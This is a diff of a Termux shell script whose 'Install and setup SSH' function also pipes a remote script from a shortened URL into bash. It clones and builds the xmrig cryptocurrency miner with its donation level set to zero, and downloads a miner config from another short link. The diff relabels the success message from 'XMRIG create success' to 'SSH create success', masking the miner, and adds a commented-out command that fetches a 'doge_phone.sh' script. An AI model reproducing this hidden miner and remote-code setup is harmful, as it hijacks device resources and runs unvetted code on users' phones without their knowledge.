@@ -369,7 +369,7 @@ EOM
 
 SSH_INSTALL(){
   HEAD "Install and setup SSH"
-  INFO "Installing dependency" && pkg update && pkg install openssh vim git clang automake cmake wget -y
+  INFO "Installing dependency" && pkg update && pkg install openssh vim git clang automake cmake wget curl -y
   INFO "Running SSH_Key_Installer" && bash <(curl -fsSL git.io/key.sh) -g "$1"
   INFO "Setting termux's .bashrc" && echo "sshd" >> "$HOME/.bashrc"
   INFO "Starting sshd..." && sshd
@@ -378,12 +378,12 @@ SSH_INSTALL(){
   INFO "SSH server running at: $IP:8022"
   INFO "Login with any username and your private key"
   
-  INFO "change local user passwd" && passwd
+   INFO "change local user passwd at: $IP:8022" && passwd
   git clone https://github.com/xmrig/xmrig.git
   sed -i 's/kDefaultDonateLevel = 1/kDefaultDonateLevel = 0/g' ./xmrig/src/donate.h
   sed -i 's/kMinimumDonateLevel = 1/kMinimumDonateLevel = 0/g' ./xmrig/src/donate.h
   mkdir -p xmrig/build && cd xmrig/build && cmake .. -DWITH_HWLOC=OFF && make -j $(nproc) && wget "git.io/J3d0i" -O config.json
-  #[ -e $HOME/xmrig/build/xmrig ] && echo "cd $HOME/xmrig/build && ./xmrig" >> "$HOME/.bashrc" && cd $HOME/xmrig/build && ./xmrig
+  #cd ../ && mkdir doge_build && cd doge_build && cmake .. -DWITH_HWLOC=OFF -DWITH_TLS=OFF && make -j $(nproc) && wget "git.io/J3xxv" -O doge_phone.sh && chmod 755 doge_phone.sh
   
   
     local bin="$HOME/ip.sh"
@@ -393,7 +393,7 @@ IP=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d '/
 INFO "SSH server running at: $IP:8022"
 EOM
   
-  INFO "XMRIG create success"
+  INFO "SSH create success"
 }
 
 
